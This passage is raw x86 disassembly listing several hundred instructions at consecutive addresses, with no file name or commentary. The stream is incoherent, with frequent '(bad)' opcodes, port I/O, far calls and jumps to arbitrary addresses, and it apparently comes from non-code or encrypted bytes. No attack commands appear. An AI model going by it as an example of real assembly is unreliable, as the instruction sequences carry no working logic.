  412772:	daa    
  412773:	mov    eax,ds:0x7b458528
  412778:	inc    ebp
  412779:	ret    
  41277a:	test   al,al
  41277c:	les    edx,FWORD PTR [edi-0x15388d9e]
  412782:	inc    edi
  412783:	or     BYTE PTR [edx+0x4d608163],bh
  412789:	jg     0x4127c4
  41278b:	pop    esp
  41278c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41278d:	fist   WORD PTR ds:0x7464306b
  412793:	fcom   DWORD PTR [edi]
  412795:	call   0x8545:0x8b6b9d50
  41279c:	cmp    BYTE PTR [esi-0x29b7e48a],dh
  4127a2:	and    BYTE PTR [edi-0x472244ae],ah
  4127a8:	dec    eax
  4127a9:	fld    TBYTE PTR [ecx]
  4127ab:	xchg   ecx,eax
  4127ac:	mov    ebp,0x2f76b8e
  4127b1:	jns    0x4127c4
  4127b3:	sbb    DWORD PTR [edi+0x425188cb],edx
  4127b9:	test   al,0x2c
  4127bb:	rol    DWORD PTR [ecx-0x78],1
  4127be:	sub    edx,DWORD PTR [ebx+0x29]
  4127c1:	popa   
  4127c2:	outs   dx,DWORD PTR ds:[esi]
  4127c3:	xchg   edx,eax
  4127c4:	std    
  4127c5:	shl    DWORD PTR [eax+0x6db14361],cl
  4127cb:	adc    dl,cl
  4127cd:	fisttp DWORD PTR [edi-0x3b]
  4127d0:	cld    
  4127d1:	and    DWORD PTR [esi],edi
  4127d3:	and    eax,0x23bc0674
  4127d8:	sub    BYTE PTR fs:[eax],ch
  4127db:	rcl    DWORD PTR [edx+0x1d],0x17
  4127df:	in     eax,dx
  4127e0:	jae    0x41285b
  4127e2:	fstp   QWORD PTR [edi]
  4127e4:	(bad)  
  4127e5:	in     eax,dx
  4127e6:	hlt    
  4127e7:	out    0x87,eax
  4127e9:	test   ebx,0xe1fcda3
  4127ef:	shl    BYTE PTR [ebx-0x28],1
  4127f2:	mov    dh,0x65
  4127f4:	les    edi,FWORD PTR [edi]
  4127f6:	dec    edx
  4127f7:	xor    al,BYTE PTR [ebx]
  4127f9:	nop
  4127fa:	push   edx
  4127fb:	push   ebx
  4127fc:	inc    edi
  4127fd:	loope  0x41283e
  4127ff:	fmul   QWORD PTR [eax]
  412801:	stos   BYTE PTR es:[edi],al
  412802:	push   0xc631e674
  412807:	cmp    eax,0x198c6924
  41280c:	aaa    
  41280d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41280e:	add    esi,ecx
  412810:	push   cs
  412811:	jge    0x4127ef
  412813:	shl    BYTE PTR [ebx+edi*2-0xc],1
  412817:	mov    ecx,0x53370700
  41281c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41281d:	dec    ebx
  41281e:	neg    BYTE PTR [ebp+esi*1-0x749c158]
  412825:	xor    BYTE PTR [ecx+edi*2+0x7b5a4cb5],0x86
  41282d:	push   ss
  41282e:	ins    BYTE PTR es:[edi],dx
  41282f:	cdq    
  412830:	ror    DWORD PTR [eax+0x57b9311a],cl
  412836:	adc    BYTE PTR [edi-0x90c3742],dh
  41283c:	mov    ecx,DWORD PTR [ecx+0x74]
  41283f:	xor    ebp,DWORD PTR [edi+edi*1]
  412842:	jae    0x412886
  412844:	pushw  es
  412846:	out    0xe6,eax
  412848:	mov    edi,0x9a202e9e
  41284d:	(bad)  
  41284e:	pop    es
  41284f:	pop    ebx
  412850:	add    dl,BYTE PTR [ebp-0x6b]
  412853:	les    ecx,FWORD PTR [edx+0x5eb155f6]
  412859:	dec    ecx
  41285a:	xchg   BYTE PTR [edi+0x0],dl
  41285d:	test   eax,0xfedb7fd7
  412862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412863:	push   ds
  412864:	in     eax,0x9e
  412866:	(bad)  
  412867:	lods   eax,DWORD PTR ds:[esi]
  412868:	jp     0x41282b
  41286a:	xchg   esp,eax
  41286b:	or     cl,BYTE PTR [ecx+0x7886508d]
  412871:	fsub   DWORD PTR [ebx]
  412873:	mov    edx,0xadf20063
  412878:	add    al,0xce
  41287a:	mov    ebx,0x1c77681a
  41287f:	fadd   st(7),st
  412881:	pop    ss
  412882:	mov    bl,dl
  412884:	mov    ebp,0xe8df65e1
  412889:	cli    
  41288a:	inc    DWORD PTR [ebx+esi*2+0x76bcd1d7]
  412891:	sbb    al,0x2e
  412894:	mov    ecx,0xbb8aa74c
  412899:	inc    ebx
  41289a:	dec    edx
  41289b:	and    DWORD PTR [edi],0xffffffcd
  41289e:	mov    WORD PTR [edx-0x4308abee],?
  4128a4:	xchg   esi,eax
  4128a5:	sbb    DWORD PTR [ecx+0x67],ebp
  4128a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a9:	mov    edx,ebp
  4128ab:	push   0xfb9e82f6
  4128b0:	std    
  4128b1:	retf   
  4128b2:	ins    BYTE PTR es:[edi],dx
  4128b3:	data16 loope 0x41289d
  4128b6:	sub    eax,0xb0acf73b
  4128bb:	ret    0xdef9
  4128be:	outs   dx,BYTE PTR ds:[esi]
  4128bf:	sub    BYTE PTR [ecx+0x3f],ch
  4128c2:	mov    DWORD PTR [ecx],edi
  4128c4:	mov    al,0x7f
  4128c6:	(bad)  
  4128c7:	jnp    0x412928
  4128c9:	and    eax,0xf2090940
  4128ce:	bound  ecx,QWORD PTR [ebx-0x4692eb81]
  4128d4:	in     al,dx
  4128d5:	mov    al,0x6a
  4128d7:	call   0x8855:0x918d7a4d
  4128de:	bound  edx,QWORD PTR [esi+eax*8-0x63]
  4128e2:	dec    eax
  4128e3:	xchg   ebp,eax
  4128e4:	jne    0x4128c7
  4128e6:	pop    esi
  4128e7:	mov    cl,0x87
  4128e9:	push   DWORD PTR [ebp-0x5898c45a]
  4128ef:	cwde   
  4128f0:	aas    
  4128f1:	je     0x412962
  4128f3:	xchg   edx,eax
  4128f4:	dec    esp
  4128f5:	adc    ah,BYTE PTR [esi+0x6a136f75]
  4128fb:	shl    DWORD PTR [ebp+0x6beeb86d],1
  412901:	jns    0x412932
  412903:	ror    esp,cl
  412905:	mov    cs,WORD PTR [ebx-0x46]
  412908:	in     eax,0x60
  41290a:	and    DWORD PTR [edi-0x795100fc],esp
  412910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412911:	dec    ebp
  412912:	cmp    edx,DWORD PTR [ebp+0x76]
  412915:	jg     0x4128d7
  412917:	out    dx,al
  412918:	push   edi
  412919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291a:	lds    ecx,FWORD PTR [eax-0x56]
  41291d:	rcr    ch,1
  41291f:	mov    ecx,0x13f786b2
  412924:	aam    0x92
  412926:	js     0x41290d
  412928:	sub    esp,0xe714b1ed
  41292e:	cmc    
  41292f:	mov    esp,0x6769c69a
  412934:	sti    
  412935:	(bad)  
  412936:	lahf   
  412937:	imul   edi,DWORD PTR [edx-0x779db33f],0xffffffb6
  41293e:	pop    ss
  41293f:	xchg   edx,eax
  412940:	ds add ch,0xae
  412944:	aam    0x3
  412946:	lods   eax,DWORD PTR ds:[esi]
  412947:	pop    ds
  412948:	jo     0x41299a
  41294a:	inc    ebx
  41294b:	cmp    DWORD PTR [eax+0x6aaf46dc],esi
  412951:	jno    0x412910
  412953:	push   ebx
  412954:	cmc    
  412955:	jmp    0x1e165422
  41295a:	pop    ss
  41295b:	icebp  
  41295c:	repnz test DWORD PTR [edx+0x1ff1b8cf],ebx
  412963:	aam    0xe6
  412965:	jb     0x412908
  412967:	or     al,0xee
  41296a:	xchg   ebp,eax
  41296b:	arpl   WORD PTR gs:[si-0x3140],dx
  412971:	mov    bh,0x7c
  412973:	fidivr DWORD PTR [edx-0x7439eb54]
  412979:	mov    al,ds:0x426eee8b
  41297e:	shl    DWORD PTR [esi+0x5ada7210],1
  412984:	dec    edi
  412985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412986:	cli    
  412987:	pop    ds
  412988:	test   DWORD PTR [esp+eiz*8-0x50],0x3423ee37
  412990:	popf   
  412991:	in     eax,dx
  412992:	add    cl,cl
  412994:	adc    eax,ecx
  412996:	xor    esi,DWORD PTR [eax+ecx*2]
  412999:	out    0x41,al
  41299b:	mov    dl,0x3b
  41299d:	repnz hlt 
  41299f:	jnp    0x41293d
  4129a1:	(bad)  
  4129a2:	fldcw  WORD PTR ds:0xa465fcf4
  4129a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129a9:	sub    al,0xde
  4129ab:	mov    ebp,0x554686a6
  4129b0:	cli    
  4129b1:	sbb    bl,cl
  4129b3:	push   0xffffffdf
  4129b5:	dec    edi
  4129b6:	leave  
  4129b7:	xor    BYTE PTR [edx],al
  4129b9:	dec    esp
  4129ba:	das    
  4129bb:	iret   
  4129bc:	sub    BYTE PTR [edx],bl
  4129be:	pop    ebx
  4129bf:	dec    edi
  4129c0:	inc    ebp
  4129c1:	pop    ecx
  4129c2:	lea    ebp,[edi+esi*2]
  4129c5:	stos   BYTE PTR es:[edi],al
  4129c6:	mov    esi,0xaa696c18
  4129cb:	ja     0x4129f7
  4129cd:	add    DWORD PTR [edi-0x22],edi
  4129d0:	aas    
  4129d1:	out    dx,eax
  4129d2:	mov    ecx,0xa6fd0c13
  4129d7:	call   0x7f02d1d1
  4129dc:	cs jae 0x412991
  4129df:	adc    dh,BYTE PTR [edi+ebx*2+0x1c1dca63]
  4129e6:	jecxz  0x412a56
  4129e8:	cmp    ah,bl
  4129ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129eb:	(bad)  
  4129ec:	aas    
  4129ed:	jae    0x4129b4
  4129ef:	jp     0x4129a5
  4129f1:	fcom   DWORD PTR [eax+0x32721f19]
  4129f7:	stc    
  4129f8:	jp     0x4129cf
  4129fa:	xchg   eax,edi
  4129fc:	shr    ebp,0x20
  4129ff:	mov    dh,0xec
  412a01:	jmp    0x412987
  412a03:	test   DWORD PTR [edi-0x68],esp
  412a06:	aas    
  412a07:	xchg   BYTE PTR [edi],dh
  412a09:	aas    
  412a0a:	inc    ebx
  412a0b:	iret   
  412a0c:	push   eax
  412a0d:	sub    eax,DWORD PTR [eax]
  412a0f:	jg     0x4129dc
  412a11:	mov    BYTE PTR [eax-0x207f5f9a],dh
  412a17:	sahf   
  412a18:	pop    ss
  412a19:	mov    ebp,0x7da8e0af
  412a1e:	rcr    BYTE PTR [ebx+0x31e69b7a],cl
  412a24:	mov    BYTE PTR [edi-0x22390cc1],bl
  412a2a:	cmovg  ebp,DWORD PTR [ebx-0x7c]
  412a2e:	mov    ch,0xb5
  412a30:	jge    0x412a6a
  412a32:	ret    
  412a33:	arpl   WORD PTR [esi+0x7c9fc7c8],sp
  412a39:	dec    esi
  412a3a:	mov    bl,0x61
  412a3c:	iret   
  412a3d:	imul   edx
  412a3f:	cwde   
  412a40:	shr    BYTE PTR [ebx-0x50],1
  412a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a44:	ds loop 0x4129d0
  412a47:	and    ah,BYTE PTR [eax+0x1d]
  412a4a:	bound  esi,QWORD PTR [ebp+0x1ff6e4ad]
  412a50:	mov    cl,0xd0
  412a52:	clc    
  412a53:	cmp    BYTE PTR [ebp-0xe],0x2
  412a57:	imul   edi,esp,0xfffffff3
  412a5a:	out    dx,al
  412a5b:	inc    ebp
  412a5c:	push   eax
  412a5d:	add    BYTE PTR [esi+0x42],bh
  412a60:	sub    BYTE PTR [esi-0x60],al
  412a63:	and    eax,0x58e278ab
  412a68:	jp     0x412a6b
  412a6a:	ins    DWORD PTR es:[edi],dx
  412a6b:	jp     0x412ac3
  412a6d:	jbe    0x412a30
  412a6f:	mov    al,ds:0x4c89f68a
  412a74:	jae    0x412a42
  412a76:	(bad)  
  412a77:	fisub  WORD PTR [esi+0x79]
  412a7a:	ret    0xa8f1
  412a7d:	pop    edx
  412a7e:	(bad)  
  412a7f:	test   DWORD PTR [ebp-0x35c7a565],0x20dfd866
  412a89:	lahf   
  412a8a:	std    
  412a8b:	jge    0x412a71
  412a8d:	jne    0x412afd
  412a8f:	rol    BYTE PTR [eax-0x31],1
  412a92:	dec    esp
  412a93:	pusha  
  412a94:	pop    edx
  412a95:	leave  
  412a96:	mov    ah,0xdb
  412a98:	das    
  412a99:	mov    ebp,0xfad22e6b
  412a9e:	xchg   ebx,eax
  412a9f:	fidivr DWORD PTR [ebx+ebx*8+0x28]
  412aa3:	mov    ecx,0x96453f2a
  412aa8:	jmp    0x60237544
  412aad:	mov    BYTE PTR [edx-0x7451e047],0xb
  412ab4:	pusha  
  412ab5:	xor    DWORD PTR [eax+esi*4],edi
  412ab8:	pusha  
  412ab9:	cmp    edi,eax
  412abb:	les    esp,FWORD PTR [ebp-0x4c]
  412abe:	add    ch,cl
  412ac0:	jno    0x412a60
  412ac2:	fnstsw WORD PTR [esi-0x53]
  412ac5:	jne    0x412b26
  412ac7:	xor    bl,BYTE PTR [edi-0x2f9eb5c4]
  412acd:	jg     0x412ab5
  412acf:	jbe    0x412b3b
  412ad1:	pop    ecx
  412ad2:	in     eax,0xe6
  412ad4:	dec    ebx
  412ad5:	mov    cl,0x95
  412ad7:	or     BYTE PTR [eax],ch
  412ad9:	imul   eax,esp,0xffffffc4
  412adc:	rcl    DWORD PTR [esi+0x5a9566ed],cl
  412ae2:	inc    ebx
  412ae3:	push   ds
  412ae4:	xchg   esp,eax
  412ae5:	outs   dx,DWORD PTR ds:[esi]
  412ae6:	xor    esi,ebx
  412ae8:	fsubr  DWORD PTR [esi-0x5569ac7e]
  412aee:	dec    ebx
  412aef:	clc    
  412af0:	lock aaa 
  412af2:	mov    dh,0x4f
  412af4:	leave  
  412af5:	mov    ecx,0xf6f566d0
  412afa:	jnp    0x412acc
  412afc:	or     ch,dl
  412afe:	mov    ebp,0x220ced8b
  412b03:	shl    DWORD PTR [edx+edx*1+0x7385f6ff],0x64
  412b0b:	mov    ds:0xa701f132,al
  412b10:	push   edx
  412b11:	pusha  
  412b12:	push   0x99929a35
  412b17:	gs inc edx
  412b19:	(bad)  
  412b1a:	push   ebx
  412b1b:	mov    ecx,edi
  412b1d:	ins    DWORD PTR es:[edi],dx
  412b1e:	mov    gs,esp
  412b20:	fmul   DWORD PTR ds:0x75220f7b
  412b26:	add    cl,BYTE PTR [ecx]
  412b28:	sub    al,0x14
  412b2a:	ss cwde 
  412b2c:	mov    al,gs:0x6e7f7e70
  412b32:	add    esp,ebx
  412b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b35:	lds    edx,FWORD PTR [eax]
  412b37:	mov    ebp,0xa693779
  412b3c:	adc    DWORD PTR [eax+0x4bb5a731],ecx
  412b42:	mov    ebx,0x6f1a0849
  412b47:	sbb    BYTE PTR [edx-0x2f2436c0],dl
  412b4d:	ins    BYTE PTR es:[edi],dx
  412b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b4f:	(bad)  
  412b50:	in     al,dx
  412b51:	sbb    eax,0x6d003b1f
  412b56:	outs   dx,DWORD PTR ds:[esi]
  412b57:	repz xor eax,0x3a4a1a9
  412b5d:	cmp    ebp,ecx
  412b5f:	std    
  412b60:	ins    DWORD PTR es:[edi],dx
  412b61:	aad    0xa6
  412b63:	cs nop
  412b65:	mov    ah,0x1
  412b67:	test   al,0x61
  412b69:	out    dx,al
  412b6a:	fstp   TBYTE PTR [esi]
  412b6c:	scas   al,BYTE PTR es:[edi]
  412b6d:	or     dh,BYTE PTR [ecx-0x6a109f46]
  412b73:	mov    dh,0x27
  412b75:	adc    DWORD PTR [esi-0x1f1dd1af],edx
  412b7b:	sbb    DWORD PTR [ecx+0x72cfa159],0xfe24a4b3
  412b85:	jno    0x412b7a
  412b87:	std    
  412b88:	xchg   ebx,eax
  412b89:	dec    ebx
  412b8a:	(bad)  
  412b8b:	xor    ax,0x1159
  412b8f:	pop    ds
  412b90:	push   esi
  412b91:	jae    0x412ba0
  412b93:	xchg   ebx,eax
  412b94:	cmp    esi,DWORD PTR es:[esi+0x706677af]
  412b9b:	ret    0xb9fb
  412b9e:	lds    esi,FWORD PTR [esi+0x4d0d4b2a]
  412ba4:	mov    ds:0x1f425275,al
  412ba9:	sub    al,ch
  412bab:	push   ds
  412bac:	not    ebx
  412bae:	and    BYTE PTR [esi],ch
  412bb0:	push   eax
  412bb1:	cmp    al,BYTE PTR [esi-0x1a]
  412bb4:	xchg   esi,eax
  412bb5:	mov    DWORD PTR [edi],ebx
  412bb7:	stc    
  412bb8:	pop    ds
  412bb9:	sbb    ebx,DWORD PTR [edi+0x49]
  412bbc:	mov    edx,0x9794b838
  412bc1:	shl    dh,cl
  412bc3:	faddp  st(0),st
  412bc5:	add    eax,0x5c1c81a0
  412bca:	fsubr  QWORD PTR [ebx-0x48b256b5]
  412bd0:	shl    DWORD PTR [edx],0xe6
  412bd3:	mov    ds:0x2a86931c,eax
  412bd8:	or     BYTE PTR [eax-0x71e0701],bh
  412bde:	inc    edi
  412bdf:	arpl   WORD PTR [eax],bx
  412be1:	pop    ss
  412be2:	push   esp
  412be3:	mov    esi,0x6c826610
  412be8:	int3   
  412be9:	imul   edi,edi,0xd8888d2e
  412bef:	data16 jae 0x412bbf
  412bf2:	pop    edi
  412bf3:	and    ch,ah
  412bf5:	retf   
  412bf6:	int3   
  412bf7:	sbb    dl,BYTE PTR [ecx-0x4f]
  412bfa:	fwait
  412bfb:	repnz test DWORD PTR [ebp-0x13],esp
  412bff:	push   0x55
  412c01:	std    
  412c02:	imul   bl
  412c04:	add    esi,DWORD PTR [ebp-0x59b17b18]
  412c0a:	cmp    eax,0x9bb8e387
  412c0f:	popf   
  412c10:	scas   al,BYTE PTR es:[edi]
  412c11:	call   0xd7b875dc
  412c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c17:	(bad)  
  412c18:	and    DWORD PTR [ecx],edi
  412c1a:	addr16 arpl dx,cx
  412c1d:	ins    DWORD PTR es:[edi],dx
  412c1e:	lods   eax,DWORD PTR ds:[esi]
  412c1f:	mov    ah,BYTE PTR [eax+ecx*1+0x57d25bd0]
  412c26:	mov    esp,0x61af5768
  412c2b:	lahf   
  412c2c:	pop    esi
  412c2d:	inc    edi
  412c2e:	lds    eax,FWORD PTR [ebx*4-0x517ffd3e]
  412c35:	mov    al,ds:0x9ce83f14
  412c3a:	mov    ds:0x8cd8600b,eax
  412c3f:	test   al,0x2d
  412c41:	(bad)  
  412c42:	push   esp
  412c43:	(bad)  
  412c44:	sbb    DWORD PTR [eax],esi
  412c46:	mov    esi,0x6537d78
  412c4b:	fisub  WORD PTR [ebx]
  412c4d:	push   cs
  412c4e:	cmp    al,0xa7
  412c50:	mov    bl,BYTE PTR [edx+eiz*1+0x4c797a08]
  412c57:	sbb    edx,esi
  412c59:	or     al,0x17
  412c5b:	jge    0x412ca6
  412c5d:	mul    BYTE PTR [ecx-0x4b372f6b]
  412c63:	retf   
  412c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c65:	bound  eax,QWORD PTR [ecx+0x70291d08]
  412c6b:	arpl   WORD PTR [edx-0xd],dx
  412c6e:	or     DWORD PTR [ebp+0x1a34813],0x31
  412c75:	in     al,dx
  412c76:	mov    eax,0x86160f34
  412c7b:	ss push ebp
  412c7d:	stos   BYTE PTR es:[edi],al
  412c7e:	test   eax,0x8694ddba
  412c83:	and    al,BYTE PTR [edx]
  412c85:	xor    esi,edi
  412c87:	mov    cl,0xfb
  412c89:	stc    
  412c8a:	jle    0x412c77
  412c8c:	(bad)  
  412c8d:	and    eax,ebx
  412c8f:	(bad)  
  412c90:	not    dl
  412c92:	pop    edi
  412c93:	in     al,dx
  412c94:	xor    ah,ah
  412c96:	sbb    DWORD PTR [esi+edi*1],esp
  412c99:	(bad)  
  412c9a:	xor    DWORD PTR [ecx],eax
  412c9c:	sub    al,0xe1
  412c9e:	icebp  
  412c9f:	cwde   
  412ca0:	pop    eax
  412ca1:	cmp    esp,DWORD PTR [eax-0x6f]
  412ca4:	icebp  
  412ca5:	loope  0x412c75
  412ca7:	jns    0x412c3a
  412ca9:	dec    ecx
  412caa:	jno    0x412c6d
  412cac:	div    DWORD PTR [edx-0x7d]
  412caf:	jne    0x412cb8
  412cb1:	or     bh,BYTE PTR [eax]
  412cb3:	cmp    DWORD PTR [ebx+0x3d058c9d],ebp
  412cb9:	(bad)  
  412cba:	mov    dl,0x56
  412cbc:	mov    esi,edi
  412cbe:	in     al,dx
  412cbf:	sbb    BYTE PTR [eax-0x79],bh
  412cc2:	and    DWORD PTR [ebx+ebx*1-0x5b],0xffffffd5
  412cc7:	bound  ecx,QWORD PTR [ecx+0x15]
  412cca:	jns    0x412d06
  412ccc:	pushf  
  412ccd:	sub    dh,BYTE PTR ds:0x3a242fd1
  412cd3:	aad    0xfa
  412cd5:	inc    edx
  412cd6:	mov    DWORD PTR [esi],esi
  412cd8:	adc    BYTE PTR [edx-0x616c9c44],0xd8
  412cdf:	jnp    0x412ccd
  412ce1:	loop   0x412c7e
  412ce3:	aas    
  412ce4:	loopne 0x412d0f
  412ce6:	addr16 int3 
  412ce8:	aam    0x25
  412cea:	cmp    eax,0x72cd6e23
  412cef:	pop    edi
  412cf0:	dec    ebx
  412cf1:	loopne 0x412ce8
  412cf3:	push   0x8e84b484
  412cf8:	sub    DWORD PTR [edi],edx
  412cfa:	add    cl,BYTE PTR [ebx-0x65]
  412cfd:	sub    al,0xa2
  412cff:	sbb    al,0xa6
  412d01:	pop    es
  412d02:	out    0x82,al
  412d04:	mov    dh,0xe2
  412d06:	lods   al,BYTE PTR ds:[esi]
  412d07:	pushf  
  412d08:	or     DWORD PTR ds:0xa4740081,ecx
  412d0e:	xor    ebp,esp
  412d10:	pop    edx
  412d11:	ins    DWORD PTR es:[edi],dx
  412d12:	dec    edx
  412d13:	fnclex 
  412d15:	mov    edi,0xb51b7c02
  412d1a:	ja     0x412d86
  412d1c:	in     al,0x4b
  412d1e:	(bad)  
  412d1f:	push   esp
  412d20:	or     eax,0x613e42ae
  412d25:	xor    eax,0xa6600ba4
  412d2a:	push   ss
  412d2b:	fistp  WORD PTR [ebx]
  412d2d:	bound  edx,QWORD PTR [edi-0x44]
  412d30:	add    al,0x74
  412d32:	mov    esp,0x9865349b
  412d37:	sahf   
  412d38:	sub    DWORD PTR [ebx],esp
  412d3a:	mov    bh,0xe3
  412d3c:	addr16 and al,0x83
  412d3f:	call   0xa4dc9cc1
  412d44:	pop    ebx
  412d45:	shl    BYTE PTR [edi+0x48],cl
  412d48:	and    eax,0xaa5baef0
  412d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4e:	cmp    eax,0x74baa6a7
  412d53:	mov    dl,0x8c
  412d55:	xchg   ebp,eax
  412d56:	jbe    0x412d0a
  412d58:	out    dx,al
  412d59:	dec    ebp
  412d5a:	xor    eax,ebp
  412d5c:	or     DWORD PTR [eax+0x251a68d6],esi
  412d62:	sub    BYTE PTR [edi],ah
  412d64:	test   DWORD PTR [edx-0x42385740],edi
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jnp    0x412d35
  412d6e:	call   0x85f9a9eb
  412d73:	loopne 0x412de8
  412d75:	call   0x8947448
  412d7a:	dec    edx
  412d7b:	push   ebp
  412d7c:	inc    edi
  412d7d:	sub    ebx,DWORD PTR [ebx+0x35]
  412d80:	pop    ebx
  412d81:	and    al,0xe9
  412d83:	lds    eax,FWORD PTR [esi+ebx*4]
  412d86:	dec    edx
  412d87:	inc    esp
  412d88:	push   edi
  412d89:	sub    cl,BYTE PTR [ecx+0x2a]
  412d8c:	inc    ebx
  412d8d:	addr16 in eax,dx
  412d8f:	out    0x4f,al
  412d91:	mov    esp,0x340c9d29
  412d96:	pop    ss
  412d97:	push   eax
  412d98:	nop
  412d99:	popf   
  412d9a:	jnp    0x412d4c
  412d9c:	jl     0x412db8
  412d9e:	adc    esp,DWORD PTR [edi-0x1d]
  412da1:	mov    ch,cl
  412da3:	xor    DWORD PTR [ecx],eax
  412da5:	pop    edx
  412da6:	pop    ds
  412da7:	and    DWORD PTR ds:0xc6e0bf0d,eax
  412dad:	mov    dh,0xab
  412daf:	mov    BYTE PTR [edi],cl
  412db1:	out    0x83,al
  412db3:	inc    ebp
  412db4:	sub    edi,edx
  412db6:	(bad)  
  412db7:	clc    
  412db8:	dec    ebx
  412db9:	jle    0x412d6b
  412dbb:	mov    ebx,0xd22891a5
  412dc0:	loopne 0x412e36
  412dc2:	clc    
  412dc3:	push   esi
  412dc4:	pop    eax
  412dc5:	pop    es
  412dc6:	dec    esp
  412dc7:	mov    eax,0xd069f06d
  412dcc:	jbe    0x412d70
  412dce:	nop
  412dcf:	call   0x18db59fa
  412dd4:	push   0xe7e68938
  412dd9:	cmp    esi,esp
  412ddb:	jle    0x412e48
  412ddd:	div    DWORD PTR [esi+0x1c]
  412de0:	inc    eax
  412de1:	pop    ebx
  412de2:	aaa    
  412de3:	sbb    cl,ah
  412de5:	mov    BYTE PTR [esp+edx*2],0x90
  412de9:	mov    BYTE PTR [ecx],ah
  412deb:	test   BYTE PTR [edi],ah
  412ded:	sbb    BYTE PTR [eax-0x68],ch
  412df0:	cmp    BYTE PTR [edx+eiz*1],ah
  412df3:	retf   0x1188
  412df6:	dec    ecx
  412df7:	push   esi
  412df8:	hlt    
  412df9:	ds xchg ebx,eax
  412dfb:	and    DWORD PTR [esi-0x58693e65],edi
  412e01:	and    eax,0x480536bb
  412e06:	pop    ebp
  412e07:	mov    ds:0x3bd85d7e,eax
  412e0c:	mov    DWORD PTR [esi+0x3d],esi
  412e0f:	addr16 out dx,al
  412e11:	cmp    ebp,esp
  412e13:	fsubrp st(5),st
  412e15:	lods   eax,DWORD PTR fs:[esi]
  412e17:	add    ecx,DWORD PTR [eax]
  412e19:	enter  0x20a,0x79
  412e1d:	(bad)  
  412e1e:	pop    ebp
  412e1f:	jns    0x412e10
  412e21:	jnp    0x412e1d
  412e23:	mov    ss,WORD PTR [esi+0x57]
  412e26:	lods   al,BYTE PTR ds:[esi]
  412e27:	push   es
  412e28:	test   al,0xf4
  412e2a:	add    eax,DWORD PTR [edx+0x5a]
  412e2d:	(bad)  
  412e2e:	pop    edx
  412e2f:	cmp    eax,DWORD PTR [ecx+0x53]
  412e32:	xor    al,ch
  412e34:	std    
  412e35:	dec    esi
  412e36:	test   BYTE PTR [esi+eiz*1+0x50],al
  412e3a:	(bad)  
  412e3c:	inc    edi
  412e3d:	cli    
  412e3e:	mov    edi,0x2af394b5
  412e43:	push   ebx
  412e44:	pushf  
  412e45:	and    esi,DWORD PTR [eax+eax*4-0x22]
  412e49:	xor    BYTE PTR ds:0x9f70e57d,bl
  412e4f:	push   ss
  412e50:	fsubrp st(1),st
  412e52:	stos   BYTE PTR es:[edi],al
  412e53:	xchg   esi,eax
  412e54:	popa   
  412e55:	in     al,0x20
  412e57:	rcl    DWORD PTR [ecx],cl
  412e59:	jb     0x412eb0
  412e5b:	mov    edx,0xd251e19a
  412e60:	xchg   esp,edx
  412e62:	bound  edi,QWORD PTR [edi]
  412e64:	inc    esi
  412e65:	add    esi,eax
  412e67:	push   esp
  412e68:	sbb    eax,0x3609c7ba
  412e6d:	mov    esp,0x60f91855
  412e72:	adc    BYTE PTR [esi-0x2e942cd5],al
  412e78:	inc    edx
  412e79:	sar    BYTE PTR [ecx],1
  412e7b:	out    0xab,eax
  412e7d:	jg     0x412eca
  412e7f:	pop    eax
  412e80:	adc    al,0x60
  412e82:	jmp    DWORD PTR [edi+0x52]
  412e85:	push   eax
  412e86:	shl    BYTE PTR [ebx],1
  412e88:	add    DWORD PTR [esi+0x666855c8],edx
  412e8e:	imul   ebx,DWORD PTR [edi],0xffffff94
  412e91:	mov    cl,0x1f
  412e93:	sar    BYTE PTR [edx+edx*4-0x77],cl
  412e97:	sbb    DWORD PTR [edi],ebp
  412e99:	ins    BYTE PTR es:[edi],dx
  412e9a:	dec    esi
  412e9b:	in     al,0x68
  412e9d:	shr    BYTE PTR [edi+ecx*1-0x18],1
  412ea1:	cmp    dh,ch
  412ea3:	add    al,0x35
  412ea5:	retf   0xb5fb
  412ea8:	adc    bl,al
  412eaa:	or     BYTE PTR ds:0x5a171626,ch
  412eb0:	cdq    
  412eb1:	or     BYTE PTR [ecx+0x3f5ca3bb],dl
  412eb7:	push   esi
  412eb8:	mov    edx,DWORD PTR [ebp-0xc]
  412ebb:	call   0xc7f792ed
  412ec0:	outs   dx,DWORD PTR ds:[esi]
  412ec1:	jne    0x412f42
  412ec3:	loope  0x412eaa
  412ec5:	dec    eax
  412ec6:	jne    0x412e48
  412ec8:	dec    ebp
  412ec9:	dec    esi
  412eca:	(bad)  
  412ecb:	in     eax,0xb4
  412ecd:	add    DWORD PTR [ecx],ebp
  412ecf:	retf   
  412ed0:	(bad)  
  412ed1:	or     eax,ebp
  412ed3:	xchg   DWORD PTR [ecx+0x71],edx
  412ed6:	adc    eax,0x16bfbfff
  412edb:	jecxz  0x412ef8
  412edd:	scas   eax,DWORD PTR es:[edi]
  412ede:	pop    ds
  412edf:	mov    esi,0xe5a5b016
  412ee4:	dec    ebp
  412ee5:	inc    ecx
  412ee6:	xchg   edi,eax
  412ee7:	push   esi
  412ee8:	test   BYTE PTR [ebx-0x4475fcd1],0x21
  412eef:	or     esp,esi
  412ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef2:	push   ecx
  412ef3:	enter  0xedfb,0x2a
  412ef7:	cmp    eax,0xde9509f0
  412efc:	push   0xce7bc683
  412f01:	sbb    BYTE PTR [esi],0x77
  412f04:	jb     0x412f28
  412f06:	iret   
  412f07:	mov    esi,0x3bfe66b2
  412f0c:	(bad)  
  412f0d:	mov    DWORD PTR [ebx-0x7e02882b],0xb55d07a7
